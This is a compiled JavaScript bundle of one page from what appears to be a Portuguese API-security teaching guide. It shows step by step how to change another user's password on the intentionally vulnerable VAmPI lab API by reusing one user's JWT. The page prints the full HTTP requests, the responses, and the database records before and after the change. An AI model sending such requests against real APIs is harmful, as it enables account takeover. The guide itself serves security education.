"use strict";(self.webpackChunkapi_security_basic_guide=self.webpackChunkapi_security_basic_guide||[]).push([[587],{3905:(e,a,n)=>{n.d(a,{Zo:()=>u,kt:()=>m});var o=n(7294);function t(e,a,n){return a in e?Object.defineProperty(e,a,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[a]=n,e}function r(e,a){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);a&&(o=o.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),n.push.apply(n,o)}return n}function s(e){for(var a=1;a<arguments.length;a++){var n=null!=arguments[a]?arguments[a]:{};a%2?r(Object(n),!0).forEach((function(a){t(e,a,n[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(n,a))}))}return e}function i(e,a){if(null==e)return{};var n,o,t=function(e,a){if(null==e)return{};var n,o,t={},r=Object.keys(e);for(o=0;o<r.length;o++)n=r[o],a.indexOf(n)>=0||(t[n]=e[n]);return t}(e,a);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(o=0;o<r.length;o++)n=r[o],a.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(t[n]=e[n])}return t}var l=o.createContext({}),d=function(e){var a=o.useContext(l),n=a;return e&&(n="function"==typeof e?e(a):s(s({},a),e)),n},u=function(e){var a=d(e.components);return o.createElement(l.Provider,{value:a},e.children)},p={inlineCode:"code",wrapper:function(e){var a=e.children;return o.createElement(o.Fragment,{},a)}},c=o.forwardRef((function(e,a){var n=e.components,t=e.mdxType,r=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),c=d(n),m=t,g=c["".concat(l,".").concat(m)]||c[m]||p[m]||r;return n?o.createElement(g,s(s({ref:a},u),{},{components:n})):o.createElement(g,s({ref:a},u))}));function m(e,a){var n=arguments,t=a&&a.mdxType;if("string"==typeof e||t){var r=n.length,s=new Array(r);s[0]=c;var i={};for(var l in a)hasOwnProperty.call(a,l)&&(i[l]=a[l]);i.originalType=e,i.mdxType="string"==typeof e?e:t,s[1]=i;for(var d=2;d<r;d++)s[d]=n[d];return o.createElement.apply(null,s)}return o.createElement.apply(null,n)}c.displayName="MDXCreateElement"},9722:(e,a,n)=>{n.r(a),n.d(a,{assets:()=>l,contentTitle:()=>s,default:()=>p,frontMatter:()=>r,metadata:()=>i,toc:()=>d});var o=n(7462),t=(n(7294),n(3905));const r={sidebar_position:2},s="Explora\xe7\xe3o",i={unversionedId:"Vulnerabilidades/Unauthorized_Password_Change copy/exploracao",id:"Vulnerabilidades/Unauthorized_Password_Change copy/exploracao",title:"Explora\xe7\xe3o",description:"---",source:"@site/docs/Vulnerabilidades/6_Unauthorized_Password_Change copy/exploracao.md",sourceDirName:"Vulnerabilidades/6_Unauthorized_Password_Change copy",slug:"/Vulnerabilidades/Unauthorized_Password_Change copy/exploracao",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Unauthorized_Password_Change copy/exploracao",draft:!1,tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2},sidebar:"defaultSidebar",previous:{title:"Descri\xe7\xe3o",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Unauthorized_Password_Change copy/descricao"},next:{title:"Corre\xe7\xe3o",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Unauthorized_Password_Change copy/correcao"}},l={},d=[{value:"Autentica\xe7\xe3o na aplica\xe7\xe3o",id:"autentica\xe7\xe3o-na-aplica\xe7\xe3o",level:2},{value:"Altera\xe7\xe3o de senha usando a rota <code>/users/v1/{username}/password</code>",id:"altera\xe7\xe3o-de-senha-usando-a-rota-usersv1usernamepassword",level:2},{value:"Vulnerabilidade na rota <code>/users/v1/{username}/password</code>",id:"vulnerabilidade-na-rota-usersv1usernamepassword",level:2},{value:"Mais refer\xeancias dispon\xedveis na OWASP.",id:"mais-refer\xeancias-dispon\xedveis-na-owasp",level:4}],u={toc:d};function p(e){let{components:a,...n}=e;return(0,t.kt)("wrapper",(0,o.Z)({},u,n,{components:a,mdxType:"MDXLayout"}),(0,t.kt)("h1",{id:"explora\xe7\xe3o"},"Explora\xe7\xe3o"),(0,t.kt)("hr",null),(0,t.kt)("p",null,"Tendo em mente os questionamentos levantados ao final da sess\xe3o anterior, \xe9 poss\xedvel realizar os testes de seguran\xe7a a fim de descobrir onde a vulnerabilidade pode ser explorada."),(0,t.kt)("h2",{id:"autentica\xe7\xe3o-na-aplica\xe7\xe3o"},"Autentica\xe7\xe3o na aplica\xe7\xe3o"),(0,t.kt)("p",null,"Para que um usu\xe1rio altere sua senha, \xe9 necess\xe1rio que o mesmo se autentique na aplica\xe7\xe3o, para isso basta utilizar a rota ",(0,t.kt)("inlineCode",{parentName:"p"},"/users/v1/login")," usando uma requisi\xe7\xe3o do tipo ",(0,t.kt)("inlineCode",{parentName:"p"},"POST")," enviando as informa\xe7\xf5es de login no body da requisi\xe7\xe3o."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request de login na aplica\xe7\xe3o"',title:'"Request',de:!0,login:!0,na:!0,'aplica\xe7\xe3o"':!0},'POST /users/v1/login HTTP/1.1\nContent-Type: application/json\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: 8fda313b-89ef-4bd5-a63a-fd5061565533\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 56\n\n{\n    "username": "jordan",\n    "password": "password"\n}\n')),(0,t.kt)("p",null,"Na response, um token JWT \xe9 enviado, \xe9 atrav\xe9s dele que a autentica\xe7\xe3o ser\xe1 realizada em todas as requisi\xe7\xf5es futuras."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Response de login na aplica\xe7\xe3o"',title:'"Response',de:!0,login:!0,na:!0,'aplica\xe7\xe3o"':!0},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 225\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sun, 02 Oct 2022 02:44:46 GMT\n\n{\n    "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.\n    eyJleHAiOjE2NjQ3Mzg2ODYsImlhdCI6MTY2NDY3ODY4Niwic3ViIjoiam9yZGFuIn0.\n    VrScPrN9cR0LMy7v7_YuGC0Yo3WR2KoCtoQZU4yAN3U",\n    "message": "Successfully logged in.",\n    "status": "success"}\n')),(0,t.kt)("h2",{id:"altera\xe7\xe3o-de-senha-usando-a-rota-usersv1usernamepassword"},"Altera\xe7\xe3o de senha usando a rota ",(0,t.kt)("inlineCode",{parentName:"h2"},"/users/v1/{username}/password")),(0,t.kt)("p",null,"Antes de realizar a altera\xe7\xe3o de senha, ser\xe1 feita uma checagem no banco de dados qual \xe9 a senha utilizada pelo usu\xe1rio ",(0,t.kt)("strong",{parentName:"p"},"jordan"),"."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-json",metastring:'title="Dados do jordan antes da altera\xe7\xe3o da senha"',title:'"Dados',do:!0,jordan:!0,antes:!0,da:!0,"altera\xe7\xe3o":!0,'senha"':!0},'    {\n        "admin": false,\n        "email": "jjga.snf19@uea.edu.br",\n        "password": "password",\n        "username": "jordan"\n    }\n')),(0,t.kt)("p",null,"A senha que o ",(0,t.kt)("strong",{parentName:"p"},"jordan")," utiliza antes da altera\xe7\xe3o \xe9 ",(0,t.kt)("em",{parentName:"p"},"password"),"."),(0,t.kt)("p",null,"Agora com o usu\xe1rio logado na aplica\xe7\xe3o, foi enviado atrav\xe9s do PostMan a requisi\xe7\xe3o do tipo ",(0,t.kt)("inlineCode",{parentName:"p"},"PUT")," leg\xedtima na rota usada para altera\xe7\xe3o de senha, sendo interceptada pelo Burp para an\xe1lise posterior."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request leg\xedtima de altera\xe7\xe3o de senha"',title:'"Request',"leg\xedtima":!0,de:!0,"altera\xe7\xe3o":!0,'senha"':!0},'PUT /users/v1/jordan/password HTTP/1.1\nContent-Type: application/json\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.\neyJleHAiOjE2NjQ3Mzg2ODYsImlhdCI6MTY2NDY3ODY4Niwic3ViIjoiam9yZGFuIn0.\nVrScPrN9cR0LMy7v7_YuGC0Yo3WR2KoCtoQZU4yAN3U\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: 653000d0-74dc-4293-a8bc-1f6a9dad3b1f\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 33\n\n{\n    "password": "newpassword"\n}\n')),(0,t.kt)("p",null,"A resposta recebida foi uma confirma\xe7\xe3o de que a altera\xe7\xe3o foi realizada com sucesso."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-json"},"HTTP/1.0 204 NO CONTENT\nContent-Type: application/json\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sun, 02 Oct 2022 02:58:00 GMT\n")),(0,t.kt)("p",null,"E, por fim, checando no banco de dados para confirmar que a altera\xe7\xe3o foi replicada para o usu\xe1rio."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-json",metastring:'title="Dados do jordan ap\xf3s a altera\xe7\xe3o da senha"',title:'"Dados',do:!0,jordan:!0,"ap\xf3s":!0,a:!0,"altera\xe7\xe3o":!0,da:!0,'senha"':!0},'   {\n      "admin": false, \n      "email": "jjga.snf19@uea.edu.br", \n      "password": "newpassword", \n      "username": "jordan"\n    }\n')),(0,t.kt)("h2",{id:"vulnerabilidade-na-rota-usersv1usernamepassword"},"Vulnerabilidade na rota ",(0,t.kt)("inlineCode",{parentName:"h2"},"/users/v1/{username}/password")),(0,t.kt)("p",null,"Para identificar a vulnerabilidade, as perguntas apresentadas pelo t\xf3pico anterior s\xe3o o suficiente. Mas, uma delas \xe9 a mais interessante para esse momento."),(0,t.kt)("ul",null,(0,t.kt)("li",{parentName:"ul"},(0,t.kt)("em",{parentName:"li"},"Fun\xe7\xf5es dispon\xedveis para um grupo de usu\xe1rios podem ser utilizadas por outro grupo (sendo necess\xe1rio descobrir apenas o endpoint da API)?"))),(0,t.kt)("p",null,"Tendo essa pergunta em mente, \xe9 hora de checar se um usu\xe1rio poderia alterar a senha de outro usu\xe1rio. Caso o token JWT n\xe3o seja usado para confirmar a identidade do usu\xe1rio, ser\xe1 poss\xedvel alterar senhas de outros usu\xe1rios."),(0,t.kt)("p",null,"No banco de dados existe um usu\xe1rio chamado ",(0,t.kt)("inlineCode",{parentName:"p"},"name1"),", que ser\xe1 a v\xedtima do teste de altera\xe7\xe3o de senha."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-json",metastring:'title="Dados da v\xedtima antes do ataque"',title:'"Dados',da:!0,"v\xedtima":!0,antes:!0,do:!0,'ataque"':!0},'    {\n      "admin": false, \n      "email": "mail1@mail.com", \n      "password": "pass1", \n      "username": "name1"\n    }\n')),(0,t.kt)("p",null,"Usando o Burp, ser\xe1 feita uma nova requisi\xe7\xe3o utilizando o token JWT do ",(0,t.kt)("strong",{parentName:"p"},"jordan"),", por\xe9m, com o nome de usu\xe1rio do ",(0,t.kt)("strong",{parentName:"p"},"name1")," com a nova senha ",(0,t.kt)("strong",{parentName:"p"},'"hackeado!"'),"."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request maliciosa usando o Burp"',title:'"Request',maliciosa:!0,usando:!0,o:!0,'Burp"':!0},'PUT /users/v1/name1/password HTTP/1.1\nContent-Type: application/json\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.\neyJleHAiOjE2NjQ3Mzg2ODYsImlhdCI6MTY2NDY3ODY4Niwic3ViIjoiam9yZGFuIn0.\nVrScPrN9cR0LMy7v7_YuGC0Yo3WR2KoCtoQZU4yAN3U\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: 653000d0-74dc-4293-a8bc-1f6a9dad3b1f\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 31\n\n{\n    "password": "hackeado!"\n}\n')),(0,t.kt)("p",null,"A resposta do VAmPI indica que a senha foi alterada com sucesso."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Response maliciosa"',title:'"Response','maliciosa"':!0},"HTTP/1.0 204 NO CONTENT\nContent-Type: application/json\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sun, 02 Oct 2022 03:36:27 GMT\n")),(0,t.kt)("p",null,"Para confirmar, ser\xe1 feita a checagem das informa\xe7\xf5es do usu\xe1rio ",(0,t.kt)("strong",{parentName:"p"},"name1")," no banco de dados da aplica\xe7\xe3o."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-json",metastring:'title="Dados da v\xedtima ap\xf3s o ataque"',title:'"Dados',da:!0,"v\xedtima":!0,"ap\xf3s":!0,o:!0,'ataque"':!0},'    {\n      "admin": false, \n      "email": "mail1@mail.com", \n      "password": "hackeado!", \n      "username": "name1"\n    }\n')),(0,t.kt)("p",null,"Isso demonstra que a aplica\xe7\xe3o est\xe1 vulner\xe1vel e que, provavelmente, est\xe1 utilizando apenas o nome de usu\xe1rio como forma de prova de identidade."),(0,t.kt)("p",null,"O JWT est\xe1 sendo subutilizado, sendo exclusivamente uma forma de garantir que somente usu\xe1rios logados na aplica\xe7\xe3o fa\xe7am a altera\xe7\xe3o da senha."),(0,t.kt)("h4",{id:"mais-refer\xeancias-dispon\xedveis-na-owasp"},"Mais refer\xeancias dispon\xedveis na ",(0,t.kt)("a",{parentName:"h4",href:"https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa5-broken-function-level-authorization.md"},"OWASP"),"."))}p.isMDXComponent=!0}}]);